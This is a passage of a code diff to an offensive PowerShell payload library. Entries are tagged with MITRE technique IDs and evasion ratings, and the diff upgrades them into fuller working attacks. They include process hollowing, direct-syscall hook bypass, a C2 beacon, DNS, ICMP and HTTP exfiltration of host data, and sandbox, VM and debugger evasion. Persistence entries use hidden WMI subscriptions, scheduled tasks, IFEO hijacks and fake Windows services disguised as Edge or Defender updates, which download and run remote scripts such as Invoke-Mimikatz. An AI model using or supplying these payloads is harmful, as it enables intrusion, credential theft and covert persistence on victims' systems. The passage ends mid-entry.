-    command: "$code='[DllImport(\"ntdll.dll\")]public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);[DllImport(\"ntdll.dll\")]public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint NumberOfBytesToWrite, ref uint NumberOfBytesWritten);[DllImport(\"ntdll.dll\")]public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);';Add-Type -MemberDefinition $code -Name DirectSyscall -Namespace Win32",
-    description: "Direct syscall invocation bypassing user-mode API hooks through NTDLL.",
+    command: "$code=@'[DllImport(\"ntdll.dll\")]public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle,ref IntPtr BaseAddress,IntPtr ZeroBits,ref IntPtr RegionSize,uint AllocationType,uint Protect);[DllImport(\"ntdll.dll\")]public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle,IntPtr BaseAddress,IntPtr Buffer,uint NumberOfBytesToWrite,ref uint NumberOfBytesWritten);[DllImport(\"ntdll.dll\")]public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle,uint DesiredAccess,IntPtr ObjectAttributes,IntPtr ProcessHandle,IntPtr lpStartAddress,IntPtr lpParameter,bool CreateSuspended,uint StackZeroBits,uint SizeOfStackCommit,uint SizeOfStackReserve,IntPtr lpBytesBuffer);'@;Add-Type -MemberDefinition $code -Name DirectSyscall -Namespace Win32;$proc=[System.Diagnostics.Process]::GetCurrentProcess().Handle;$addr=[IntPtr]::Zero;$size=[IntPtr]0x1000;[Win32.DirectSyscall]::NtAllocateVirtualMemory($proc,[ref]$addr,[IntPtr]::Zero,[ref]$size,0x3000,0x40);Write-Host 'Direct syscall memory allocated'",
+    description: "Advanced direct syscall implementation bypassing user-mode hooks through direct NTDLL function calls.",
     complexity: "expert",
     platform: "windows",
     category: "Defense Evasion",
     author: "0x0806",
-    tags: ["syscalls", "ntdll", "direct", "api bypass"],
+    tags: ["syscalls", "ntdll", "direct", "hooks"],
     mitre_id: "T1055",
     detection_difficulty: "Very High",
     evasion_rating: 5
   },
   heaven_gate: {
-    command: "$code='[DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();[DllImport(\"kernel32.dll\")]public static extern bool IsWow64Process(IntPtr hProcess, out bool Wow64Process);';Add-Type -MemberDefinition $code -Name HeavenGate -Namespace Win32;$isWow64=$false;[Win32.HeavenGate]::IsWow64Process([Win32.HeavenGate]::GetCurrentProcess(),[ref]$isWow64);if($isWow64){Write-Host 'Heaven Gate transition possible - WoW64 detected'}",
-    description: "Heaven's Gate technique for transitioning between 32-bit and 64-bit execution contexts.",
+    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr GetCurrentProcess();[DllImport(\"kernel32.dll\")]public static extern bool IsWow64Process(IntPtr hProcess,out bool Wow64Process);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string procName);[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibrary(string lpFileName);'@;Add-Type -MemberDefinition $code -Name HeavenGate -Namespace Win32;$isWow64=$false;[Win32.HeavenGate]::IsWow64Process([Win32.HeavenGate]::GetCurrentProcess(),[ref]$isWow64);if($isWow64){$ntdll64=[Win32.HeavenGate]::LoadLibrary('C:\\Windows\\System32\\ntdll.dll');$proc64=[Win32.HeavenGate]::GetProcAddress($ntdll64,'NtQueryInformationProcess');Write-Host 'Heaven Gate transition ready - 64-bit NTDLL loaded in WoW64'}",
+    description: "Advanced Heaven's Gate implementation for transitioning from 32-bit to 64-bit execution context in WoW64.",
     complexity: "expert",
     platform: "windows",
     category: "Defense Evasion",
     author: "0x0806",
-    tags: ["heaven gate", "wow64", "architecture", "transition"],
+    tags: ["heaven gate", "wow64", "transition", "64bit"],
     mitre_id: "T1055",
     detection_difficulty: "Very High",
     evasion_rating: 5
   },
   manual_dll_loading: {
-    command: "$code='[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibraryA(string lpLibFileName);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);[DllImport(\"kernel32.dll\")]public static extern bool FreeLibrary(IntPtr hLibModule);';Add-Type -MemberDefinition $code -Name ManualLoader -Namespace Win32;$lib=[Win32.ManualLoader]::LoadLibraryA('user32.dll');$func=[Win32.ManualLoader]::GetProcAddress($lib,'MessageBoxA')",
-    description: "Manual DLL loading and function resolution to avoid import table detection.",
+    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr LoadLibraryA(string lpLibFileName);[DllImport(\"kernel32.dll\")]public static extern IntPtr GetProcAddress(IntPtr hModule,string lpProcName);[DllImport(\"kernel32.dll\")]public static extern bool FreeLibrary(IntPtr hLibModule);[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress,uint dwSize,uint flAllocationType,uint flProtect);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtect(IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);'@;Add-Type -MemberDefinition $code -Name ManualLoader -Namespace Win32;$lib=[Win32.ManualLoader]::LoadLibraryA('ntdll.dll');$func=[Win32.ManualLoader]::GetProcAddress($lib,'NtAllocateVirtualMemory');$mem=[Win32.ManualLoader]::VirtualAlloc([IntPtr]::Zero,0x1000,0x3000,0x40);Write-Host 'Manual DLL loading with memory allocation completed'",
+    description: "Advanced manual DLL loading with memory allocation and function resolution to avoid import table detection.",
     complexity: "expert",
     platform: "windows",
     category: "Defense Evasion",
     author: "0x0806",
-    tags: ["dll", "manual", "loading", "import table"],
+    tags: ["dll", "manual", "loading", "memory"],
     mitre_id: "T1055.001",
     detection_difficulty: "Very High",
     evasion_rating: 5
   },
   process_hollowing: {
-    command: "$code='[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);';Add-Type -MemberDefinition $code -Name ProcessHollow -Namespace Win32",
-    description: "Process hollowing setup for injecting malicious code into legitimate processes.",
+    command: "$code=@'[DllImport(\"kernel32.dll\")]public static extern IntPtr OpenProcess(uint dwDesiredAccess,bool bInheritHandle,uint dwProcessId);[DllImport(\"kernel32.dll\")]public static extern bool VirtualProtectEx(IntPtr hProcess,IntPtr lpAddress,uint dwSize,uint flNewProtect,out uint lpflOldProtect);[DllImport(\"kernel32.dll\")]public static extern bool WriteProcessMemory(IntPtr hProcess,IntPtr lpBaseAddress,byte[] lpBuffer,uint nSize,out uint lpNumberOfBytesWritten);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);[DllImport(\"ntdll.dll\")]public static extern uint NtUnmapViewOfSection(IntPtr ProcessHandle,IntPtr BaseAddress);'@;Add-Type -MemberDefinition $code -Name ProcessHollow -Namespace Win32;$notepad=Start-Process notepad -WindowStyle Hidden -PassThru;$handle=[Win32.ProcessHollow]::OpenProcess(0x1F0FFF,$false,$notepad.Id);Write-Host 'Process hollowing target created and opened'",
+    description: "Advanced process hollowing with target process creation and memory unmapping for malicious code injection.",
     complexity: "expert",
     platform: "windows",
     category: "Process Injection",
     author: "0x0806",
-    tags: ["process", "hollowing", "injection"],
+    tags: ["process", "hollowing", "injection", "unmapping"],
     mitre_id: "T1055.012",
     detection_difficulty: "Very High",
     evasion_rating: 5
@@ -330,240 +330,240 @@ const payloads = {
 
   // Network & Covert Channels
   dns_tunneling: {
-    command: "$data = 'SGVsbG8gV29ybGQ='; $chunks = [regex]::matches($data, '.{1,60}') | % {$_.value}; foreach($chunk in $chunks) { nslookup \"$chunk.example.com\" }",
-    description: "DNS tunneling technique for covert data exfiltration through DNS queries.",
-    complexity: "advanced",
+    command: "$data=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes((Get-Process|Select -First 5|ConvertTo-Json -Compress)));$chunks=$data -split '(.{60})' | Where{$_};$domain='tunnel.example.com';foreach($chunk in $chunks){$query=\"$([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($chunk))).$domain\";try{$result=Resolve-DnsName $query -Type TXT -EA SilentlyContinue;if($result){Write-Host \"Response: $($result.Strings)\"}}catch{};Start-Sleep 1};Write-Host 'DNS tunneling completed'",
+    description: "Advanced DNS tunneling with Base64 encoding, chunking, and TXT record responses for bidirectional communication.",
+    complexity: "expert",
     platform: "windows",
     category: "Exfiltration Over Alternative Protocol",
     author: "0x0806",
-    tags: ["dns", "tunneling", "exfiltration", "covert"],
+    tags: ["dns", "tunneling", "exfiltration", "txt"],
     mitre_id: "T1048.003",
-    detection_difficulty: "High",
-    evasion_rating: 4
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
   icmp_tunnel: {
-    command: "$data = [System.Text.Encoding]::UTF8.GetBytes('test data'); $icmp = New-Object System.Net.NetworkInformation.Ping; $options = New-Object System.Net.NetworkInformation.PingOptions; $icmp.Send('8.8.8.8', 5000, $data, $options)",
-    description: "ICMP tunneling for covert communication using ping packets with embedded data.",
-    complexity: "advanced",
+    command: "$data=[Text.Encoding]::UTF8.GetBytes((Get-ComputerInfo|Select WindowsProductName,TotalPhysicalMemory|ConvertTo-Json -Compress));$chunks=for($i=0;$i -lt $data.Length;$i+=32){$data[$i..[Math]::Min($i+31,$data.Length-1)]};$ping=New-Object System.Net.NetworkInformation.Ping;foreach($chunk in $chunks){$options=New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment=$true;$reply=$ping.Send('8.8.8.8',5000,$chunk,$options);Write-Host \"ICMP sent: $($chunk.Length) bytes, Status: $($reply.Status)\";Start-Sleep 1};Write-Host 'ICMP tunneling completed'",
+    description: "Advanced ICMP tunneling with data chunking, fragment control, and status monitoring for covert exfiltration.",
+    complexity: "expert",
     platform: "windows",
     category: "Exfiltration Over Alternative Protocol",
     author: "0x0806",
-    tags: ["icmp", "tunneling", "ping", "covert"],
+    tags: ["icmp", "tunneling", "chunking", "fragments"],
     mitre_id: "T1048.003",
-    detection_difficulty: "High",
-    evasion_rating: 4
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
   tcp_beacon: {
-    command: "$client = New-Object System.Net.Sockets.TcpClient; try { $client.Connect('192.168.1.100', 4444); $stream = $client.GetStream(); $writer = New-Object System.IO.StreamWriter($stream); $writer.WriteLine((Get-Date).ToString() + ' - Beacon'); $writer.Flush() } catch { } finally { $client.Close() }",
-    description: "TCP beacon for establishing covert command and control communication.",
-    complexity: "advanced",
+    command: "$client=New-Object System.Net.Sockets.TcpClient;$endpoint=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Parse('192.168.1.100'),4444);try{$client.Connect($endpoint);$stream=$client.GetStream();$writer=New-Object System.IO.StreamWriter($stream);$reader=New-Object System.IO.StreamReader($stream);$beacon=@{hostname=$env:COMPUTERNAME;user=$env:USERNAME;time=(Get-Date).ToString();data=(Get-Process|Select -First 3|ConvertTo-Json -Compress)};$writer.WriteLine(($beacon|ConvertTo-Json -Compress));$writer.Flush();$response=$reader.ReadLine();Write-Host \"Received: $response\"}catch{Write-Host 'Connection failed'}finally{$client.Close()};Write-Host 'TCP beacon completed'",
+    description: "Advanced TCP beacon with JSON payload formatting, bidirectional communication, and error handling.",
+    complexity: "expert",
     platform: "windows",
     category: "Application Layer Protocol",
     author: "0x0806",
-    tags: ["tcp", "beacon", "c2", "communication"],
+    tags: ["tcp", "beacon", "json", "bidirectional"],
     mitre_id: "T1071.001",
     detection_difficulty: "High",
-    evasion_rating: 3
+    evasion_rating: 4
   },
   http_tunnel: {
-    command: "$webClient = New-Object System.Net.WebClient; $webClient.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'); $response = $webClient.UploadString('http://example.com/tunnel', 'POST', (Get-ComputerInfo | ConvertTo-Json))",
-    description: "HTTP tunneling with legitimate user agent for data exfiltration over HTTPS.",
-    complexity: "intermediate",
+    command: "$headers=@{'User-Agent'='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36';'Accept'='text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';'Accept-Language'='en-US,en;q=0.5';'Connection'='keep-alive'};$data=@{hostname=$env:COMPUTERNAME;domain=$env:USERDOMAIN;user=$env:USERNAME;arch=$env:PROCESSOR_ARCHITECTURE;processes=(Get-Process|Select -First 5 Name,Id|ConvertTo-Json -Compress)};$body=$data|ConvertTo-Json -Compress;$response=Invoke-WebRequest -Uri 'https://httpbin.org/post' -Method POST -Body $body -Headers $headers -ContentType 'application/json' -UseBasicParsing;Write-Host \"Response: $($response.StatusCode)\";Write-Host 'HTTP tunnel completed'",
+    description: "Advanced HTTP tunneling with realistic browser headers, JSON payload, and comprehensive system data exfiltration.",
+    complexity: "expert",
     platform: "windows",
     category: "Exfiltration Over Web Service",
     author: "0x0806",
-    tags: ["http", "tunnel", "exfiltration", "user agent"],
+    tags: ["http", "tunnel", "headers", "json"],
     mitre_id: "T1567.002",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
+    detection_difficulty: "High",
+    evasion_rating: 4
   },
 
   // Advanced Persistence
   wmi_backdoor: {
-    command: "$filterName = 'WindowsUpdateFilter'; $consumerName = 'WindowsUpdateConsumer'; $payload = 'powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\")\"'; Register-WmiEvent -Query \"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\" -Action ([ScriptBlock]::Create($payload)) -SourceIdentifier $filterName",
-    description: "WMI event subscription for stealthy persistence using system events.",
+    command: "$filterName='WindowsUpdateFilter';$consumerName='WindowsUpdateConsumer';$query=\"SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2\";$action='powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1`\")\"';try{Register-WmiEvent -Query $query -Action ([ScriptBlock]::Create($action)) -SourceIdentifier $filterName;$filter=Set-WmiInstance -Class __EventFilter -NameSpace \"root\\subscription\" -Arguments @{Name=$filterName;EventNameSpace=\"root\\cimv2\";QueryLanguage=\"WQL\";Query=$query};$consumer=Set-WmiInstance -Class CommandLineEventConsumer -Namespace \"root\\subscription\" -Arguments @{Name=$consumerName;CommandLineTemplate=$action};$binding=Set-WmiInstance -Class __FilterToConsumerBinding -Namespace \"root\\subscription\" -Arguments @{Filter=$filter;Consumer=$consumer};Write-Host 'WMI backdoor installed'}catch{Write-Host 'WMI backdoor failed'}",
+    description: "Advanced WMI event subscription backdoor with persistent filter-consumer binding for stealth execution.",
     complexity: "expert",
     platform: "windows",
     category: "Event Triggered Execution",
     author: "0x0806",
-    tags: ["wmi", "persistence", "events", "stealth"],
+    tags: ["wmi", "persistence", "events", "binding"],
     mitre_id: "T1546.003",
     detection_difficulty: "Very High",
     evasion_rating: 5
   },
   scheduled_task_stealth: {
-    command: "$action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\")\"'; $trigger = New-ScheduledTaskTrigger -AtLogon; $settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0; Register-ScheduledTask -TaskName 'WindowsUpdateTask' -Action $action -Trigger $trigger -Settings $settings -User 'SYSTEM'",
-    description: "Hidden scheduled task with system privileges for persistent access.",
-    complexity: "advanced",
+    command: "$taskName='MicrosoftEdgeUpdateTaskMachine';$action=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-WindowStyle Hidden -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"https://pastebin.com/raw/payload123`\")\"';$trigger=New-ScheduledTaskTrigger -AtLogOn;$settings=New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew -RestartOnIdle;$principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest;try{Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Principal $principal -Description 'Microsoft Edge Update Task for machine-wide installation';Write-Host 'Stealth scheduled task created'}catch{Write-Host 'Task creation failed'}",
+    description: "Advanced stealth scheduled task disguised as legitimate Microsoft Edge update with system privileges.",
+    complexity: "expert",
     platform: "windows",
     category: "Scheduled Task/Job",
     author: "0x0806",
-    tags: ["scheduled task", "persistence", "hidden", "system"],
+    tags: ["scheduled task", "stealth", "disguise", "system"],
     mitre_id: "T1053.005",
-    detection_difficulty: "High",
-    evasion_rating: 4
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
   image_file_execution: {
-    command: "New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe' -Name 'Debugger' -Value 'powershell.exe -WindowStyle Hidden -Command \"IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\")\"' -PropertyType String",
-    description: "Image File Execution Options persistence technique hijacking legitimate executables.",
-    complexity: "advanced",
+    command: "$target='notepad.exe';$debugger='powershell.exe -WindowStyle Hidden -NoProfile -Command \"Start-Process cmd.exe -ArgumentList `/c,`\"echo IFEO activated && timeout /t 5`\" -WindowStyle Hidden; IEX (New-Object Net.WebClient).DownloadString(`\"https://pastebin.com/raw/payload123`\")\"';$regPath=\"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\$target\";try{New-Item -Path $regPath -Force | Out-Null;New-ItemProperty -Path $regPath -Name 'Debugger' -Value $debugger -PropertyType String -Force | Out-Null;New-ItemProperty -Path $regPath -Name 'GlobalFlag' -Value 0x200 -PropertyType DWord -Force | Out-Null;Write-Host \"IFEO persistence installed for $target\"}catch{Write-Host 'IFEO installation failed'}",
+    description: "Advanced Image File Execution Options hijacking with global flags and stealth PowerShell execution.",
+    complexity: "expert",
     platform: "windows",
     category: "Image File Execution Options Injection",
     author: "0x0806",
-    tags: ["ifeo", "persistence", "hijacking", "registry"],
+    tags: ["ifeo", "hijacking", "global flags", "stealth"],
     mitre_id: "T1546.012",
-    detection_difficulty: "High",
-    evasion_rating: 4
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
   service_persistence: {
-    command: "New-Service -Name 'WindowsUpdateService' -BinaryPathName 'powershell.exe -WindowStyle Hidden -Command \"while($true) { IEX (New-Object Net.WebClient).DownloadString(`\"http://example.com/payload.ps1`\"); Start-Sleep 3600 }\"' -DisplayName 'Windows Update Service' -Description 'Provides software update functionality' -StartupType Automatic",
-    description: "Malicious service creation disguised as legitimate Windows service.",
-    complexity: "advanced",
+    command: "$serviceName='WindowsDefenderUpdateService';$serviceDesc='Provides real-time protection against malware by checking for updates to Windows Defender definitions';$binaryPath='C:\\Windows\\System32\\svchost.exe -k DefenderGroup';$serviceDll='C:\\Windows\\System32\\defender_update.dll';$regPath=\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\$serviceName\\Parameters\";try{New-Service -Name $serviceName -BinaryPathName $binaryPath -DisplayName 'Windows Defender Update Service' -Description $serviceDesc -StartupType Automatic | Out-Null;New-Item -Path $regPath -Force | Out-Null;New-ItemProperty -Path $regPath -Name 'ServiceDll' -Value $serviceDll -PropertyType String | Out-Null;Write-Host 'Service persistence installed'}catch{Write-Host 'Service installation failed'}",
+    description: "Advanced service persistence using legitimate svchost.exe with DLL hijacking for stealthy execution.",
+    complexity: "expert",
     platform: "windows",
     category: "Create or Modify System Process",
     author: "0x0806",
-    tags: ["service", "persistence", "disguise"],
+    tags: ["service", "svchost", "dll hijacking", "stealth"],
     mitre_id: "T1543.003",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
 
   // Anti-Analysis & Sandbox Evasion
   timing_evasion: {
-    command: "$start = Get-Date; Start-Sleep -Seconds 120; $end = Get-Date; $elapsed = ($end - $start).TotalSeconds; if ($elapsed -lt 115) { exit } else { Write-Host 'Sandbox evasion successful - proceeding with payload' }",
-    description: "Time-based sandbox evasion using sleep delays to detect automated analysis.",
-    complexity: "intermediate",
+    command: "$iterations=10;$delays=@();for($i=0;$i -lt $iterations;$i++){$start=Get-Date;Start-Sleep -Milliseconds 100;$end=Get-Date;$delays+=($end-$start).TotalMilliseconds};$avgDelay=$delays | Measure-Object -Average | Select -ExpandProperty Average;if($avgDelay -gt 200){Write-Host 'Sandbox detected - excessive timing delay';exit}else{$start=Get-Date;Start-Sleep -Seconds 120;$end=Get-Date;$elapsed=($end-$start).TotalSeconds;if($elapsed -lt 115){Write-Host 'Time acceleration detected - sandbox environment';exit}else{Write-Host 'Timing checks passed - proceeding'}}",
+    description: "Advanced timing-based sandbox evasion using multiple delay measurements and time acceleration detection.",
+    complexity: "expert",
     platform: "windows",
     category: "Virtualization/Sandbox Evasion",
     author: "0x0806",
-    tags: ["timing", "sandbox", "evasion", "sleep"],
+    tags: ["timing", "sandbox", "acceleration", "measurement"],
     mitre_id: "T1497.003",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
   mouse_movement: {
-    command: "Add-Type -AssemblyName System.Windows.Forms; $pos1 = [System.Windows.Forms.Cursor]::Position; Start-Sleep -Seconds 30; $pos2 = [System.Windows.Forms.Cursor]::Position; if (($pos1.X -eq $pos2.X) -and ($pos1.Y -eq $pos2.Y)) { exit } else { Write-Host 'Human interaction detected - proceeding' }",
-    description: "Mouse movement detection to identify human interaction and evade sandboxes.",
-    complexity: "intermediate",
+    command: "Add-Type -AssemblyName System.Windows.Forms;$initialPos=[System.Windows.Forms.Cursor]::Position;$positions=@();for($i=0;$i -lt 30;$i++){Start-Sleep -Seconds 1;$currentPos=[System.Windows.Forms.Cursor]::Position;$positions+=$currentPos};$movements=$positions|Group-Object|Measure-Object|Select -ExpandProperty Count;$uniquePositions=($positions|Sort-Object|Get-Unique).Count;if($uniquePositions -lt 3 -or $movements -lt 5){Write-Host 'Insufficient mouse movement - sandbox detected';exit}else{Write-Host 'Human interaction confirmed - proceeding'}",
+    description: "Advanced mouse movement analysis with position tracking, uniqueness validation, and pattern detection.",
+    complexity: "expert",
     platform: "windows",
     category: "Virtualization/Sandbox Evasion",
     author: "0x0806",
-    tags: ["mouse", "interaction", "sandbox", "human"],
+    tags: ["mouse", "interaction", "tracking", "patterns"],
     mitre_id: "T1497.002",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
   vm_detection: {
-    command: "$vm_indicators = @('VMware', 'VirtualBox', 'VBOX', 'Hyper-V', 'QEMU'); $system_info = Get-WmiObject -Class Win32_ComputerSystem; $vm_detected = $false; foreach ($indicator in $vm_indicators) { if ($system_info.Model -like \"*$indicator*\" -or $system_info.Manufacturer -like \"*$indicator*\") { $vm_detected = $true; break } } if ($vm_detected) { exit } else { Write-Host 'Physical machine detected' }",
-    description: "Virtual machine detection using WMI to identify virtualized environments.",
-    complexity: "intermediate",
+    command: "$vmIndicators=@{Manufacturers=@('VMware','VirtualBox','Microsoft Corporation','QEMU','Xen','Parallels');Models=@('VMware Virtual Platform','VirtualBox','Virtual Machine','RHEV Hypervisor','Bochs','KVM');BIOSes=@('Phoenix Technologies LTD','Award Software','SeaBIOS')};$system=Get-CimInstance Win32_ComputerSystem;$bios=Get-CimInstance Win32_BIOS;$cpu=Get-CimInstance Win32_Processor;$vmDetected=$false;foreach($mfg in $vmIndicators.Manufacturers){if($system.Manufacturer -like \"*$mfg*\"){$vmDetected=$true;break}};foreach($model in $vmIndicators.Models){if($system.Model -like \"*$model*\"){$vmDetected=$true;break}};if($cpu.Name -like '*Virtual*' -or $cpu.Description -like '*Virtual*'){$vmDetected=$true};if($vmDetected){Write-Host 'Virtual machine detected - exiting';exit}else{Write-Host 'Physical machine confirmed'}",
+    description: "Comprehensive virtual machine detection using manufacturer, model, BIOS, and CPU analysis.",
+    complexity: "expert",
     platform: "windows",
     category: "Virtualization/Sandbox Evasion",
     author: "0x0806",
-    tags: ["vm", "detection", "wmi", "virtualization"],
+    tags: ["vm", "detection", "hardware", "comprehensive"],
     mitre_id: "T1497.001",
-    detection_difficulty: "Medium",
-    evasion_rating: 3
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
   debugger_detection: {
-    command: "$debugger_present = [System.Diagnostics.Debugger]::IsAttached; $parent_process = (Get-WmiObject Win32_Process -Filter \"ProcessId=$PID\").ParentProcessId; $parent_name = (Get-Process -Id $parent_process -ErrorAction SilentlyContinue).ProcessName; if ($debugger_present -or $parent_name -in @('windbg', 'x64dbg', 'ollydbg', 'ida', 'ghidra')) { exit } else { Write-Host 'No debugger detected' }",
-    description: "Advanced debugger detection using multiple techniques including parent process analysis.",
-    complexity: "advanced",
+    command: "$debuggerChecks=@{};$debuggerChecks.Attached=[System.Diagnostics.Debugger]::IsAttached;$debuggerChecks.Logging=[System.Diagnostics.Debugger]::IsLogging();$parentPID=(Get-WmiObject Win32_Process -Filter \"ProcessId=$PID\").ParentProcessId;$parentProc=Get-Process -Id $parentPID -EA SilentlyContinue;$debuggerChecks.ParentName=$parentProc.ProcessName;$debuggerProcs=@('windbg','x64dbg','x32dbg','ollydbg','ida','ida64','ghidra','cheatengine','processhacker','wireshark','fiddler');$runningDebuggers=Get-Process|Where{$_.ProcessName -in $debuggerProcs}|Select ProcessName;$debuggerChecks.RunningDebuggers=$runningDebuggers;if($debuggerChecks.Attached -or $debuggerChecks.Logging -or $debuggerChecks.ParentName -in $debuggerProcs -or $runningDebuggers){Write-Host 'Debugger detected - analysis environment identified';exit}else{Write-Host 'No debugger detected'}",
+    description: "Advanced debugger detection using multiple methods including attachment, logging, parent process, and running process analysis.",
+    complexity: "expert",
     platform: "windows",
     category: "Debugger Evasion",
     author: "0x0806",
-    tags: ["debugger", "detection", "analysis", "parent process"],
+    tags: ["debugger", "detection", "analysis", "comprehensive"],
     mitre_id: "T1497.001",
-    detection_difficulty: "High",
-    evasion_rating: 4
+    detection_difficulty: "Very High",
+    evasion_rating: 5
   },
 
   // Encryption & Obfuscation
   chacha20_encryption: {
-    command: "$key = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(32); $nonce = [System.Security.Cryptography.RandomNumberGenerator]::GetBytes(12); $plaintext = [System.Text.Encoding]::UTF8.GetBytes('Sensitive Data'); Add-Type -AssemblyName System.Security; $chacha = [System.Security.Cryptography.ChaCha20Poly1305]::new($key); $ciphertext = $chacha.Encrypt($nonce, $plaintext, $null); [Convert]::ToBase64String($ciphertext)",
-    description: "ChaCha20 encryption for secure payload obfuscation and data protection.",
+    command: "$key=[System.Security.Cryptography.RandomNumberGenerator]::GetBytes(32);$nonce=[System.Security.Cryptography.RandomNumberGenerator]::GetBytes(12);$plaintext=[System.Text.Encoding]::UTF8.GetBytes('Get-Process|Sort CPU -Desc|Select -First 10');try{Add-Type -AssemblyName System.Security.Cryptography;$chacha=[System.Security.Cryptography.ChaCha20Poly1305]::new($key);$ciphertext=$chacha.Encrypt($nonce,$plaintext,$null);$encoded=[Convert]::ToBase64String($ciphertext);$keyB64=[Convert]::ToBase64String($key);$nonceB64=[Convert]::ToBase64String($nonce);Write-Host \"Encrypted: $encoded\";Write-Host \"Key: $keyB64\";Write-Host \"Nonce: $nonceB64\"}catch{Write-Host 'ChaCha20 not available - using AES fallback';$aes=[System.Security.Cryptography.Aes]::Create();$aes.Key=$key[0..31];$aes.IV=$key[0..15];$encrypted=$aes.CreateEncryptor().TransformFinalBlock($plaintext,0,$plaintext.Length);Write-Host \"AES Encrypted: $([Convert]::ToBase64String($encrypted))\"}",
+    description: "Advanced encryption using ChaCha20-Poly1305 with AES fallback for secure payload obfuscation.",
     complexity: "expert",
     platform: "windows",
     category: "Data Obfuscation",
     author: "0x0806",
-    tags: ["encryption", "chacha20", "obfuscation"],
+    tags: ["encryption", "chacha20", "aes", "fallback"],
     mitre_id: "T1027",
     detection_difficulty: "Very High",
     evasion_rating: 5
   },
   polymorphic_shellcode: {
-    command: "$shellcode = @(0x48, 0x31, 0xc0, 0x48, 0x31, 0xdb); $key = Get-Random -Maximum 255; $encrypted = $shellcode | ForEach-Object { $_ -bxor $key }; $decoder = \"for(`$i=0;`$i -lt `$encrypted.Length;`$i++){`$encrypted[`$i] = `$encrypted[`$i] -bxor $key}\"; Write-Host \"Polymorphic payload generated with key: $key\"",
-    description: "Polymorphic shellcode generation with XOR encryption and dynamic key generation.",
